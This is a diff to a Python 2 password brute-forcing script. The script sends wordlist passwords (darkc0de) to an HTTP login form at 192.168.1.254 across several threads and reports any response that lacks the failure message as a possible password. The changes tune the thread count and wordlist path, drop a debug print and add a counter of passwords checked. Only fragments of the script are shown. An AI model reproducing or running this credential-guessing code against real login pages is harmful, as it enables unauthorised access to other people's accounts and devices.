@@ -28,10 +28,6 @@ as there will be less data available to threads at any one time.  This
 may or may not matter, as the grinder will most likely be network-I/O-
 bound, and not disk-I/O-bound.
 
-TODO::
-I'd like to add determination of rate of password checking, as well as
-an estimated time remaining....
-
 With no sleep in the status function:
 Attempted: 1707657/0	Elapsed: 161.91s	Rate: 10547.13pw/s
 real    2m42.241s
@@ -69,12 +65,12 @@ import threading
 import time
 
 # Useful variables
-threadcount=10
+threadcount=3
 ip='192.168.1.254'
 port=80
 fail='The password is incorrect'
-wordlist='/pentest/passwords/wordlists/darkc0de.lst'
-wordlist='../darkc0de.lst'
+#wordlist='/pentest/passwords/wordlists/darkc0de.lst'
+wordlist='/root/darkc0de-shorter.lst'
 
 # Set stdout to unbuffered
 sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)
@@ -198,7 +194,6 @@ def run(name,status): #headers, formdata, get_pw):
 			formd = formdata % pw
 			head = headers % len(formd)
 			req = '%s\r\n\r\n%s' % (head,formd)
-			print req
 			data = ''
 			soc.send(req)
 			while data.lower().find('</html') < 0:
@@ -206,6 +201,7 @@ def run(name,status): #headers, formdata, get_pw):
 			if data.lower().find(fail.lower()) < 0:
 				print "Tried password %s, fail string not found.  Possible password detected.  Response: %s" % (pw, data)
 			pwq.task_done()
+			status.update_num_checked()
 		except Queue.Empty:
 			pass
 
